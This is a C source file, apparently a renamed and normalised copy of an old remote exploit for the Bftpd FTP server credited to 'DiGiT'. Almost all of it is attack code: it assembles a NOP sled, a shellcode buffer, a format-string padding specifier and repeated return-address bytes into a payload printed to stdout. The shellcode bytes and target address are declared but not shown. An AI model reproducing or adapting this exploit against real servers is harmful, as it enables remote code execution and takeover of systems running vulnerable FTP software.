#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 long ADDR ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC2 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,unsigned char,...) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC5 (char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*) ; 
 int FUNC7 (char*) ; 

int FUNC8(int argc, char *argv[]) 
{
  char lenbuf[1024],nopbuf[256], addrbuf[32], buf[256];
  int offset=0,length, nopcount=100,i;
  long nop_addr = ADDR;

  if(argc > 1)
    offset = FUNC0(argv[1]);

  FUNC2 (nopbuf, '\x90', nopcount);
  nop_addr = nop_addr + offset;

  FUNC6(buf, nopbuf);
  FUNC5(buf, shellcode);

  length=1024-FUNC7(shellcode)-nopcount+4-14;

  FUNC5(buf, "%.");
  FUNC4(lenbuf, "%dd", length);
  FUNC5(buf, lenbuf);

  FUNC4(addrbuf, "%c%c%c%c",
    (unsigned char) ((nop_addr >>  0) & 0xff),
    (unsigned char) ((nop_addr >>  8) & 0xff),
    (unsigned char) ((nop_addr >> 16) & 0xff),
    (unsigned char) ((nop_addr >> 24) & 0xff));

  for(i = 0 ; i < 4 ; i++) 
    FUNC5(buf, addrbuf);

  FUNC1(stderr, "Bftpd remote exploit, by DiGiT\n");
  FUNC1(stderr, "Using Address = 0x%lx\n", nop_addr);
  FUNC3("%s\n", buf);

  return 0;
}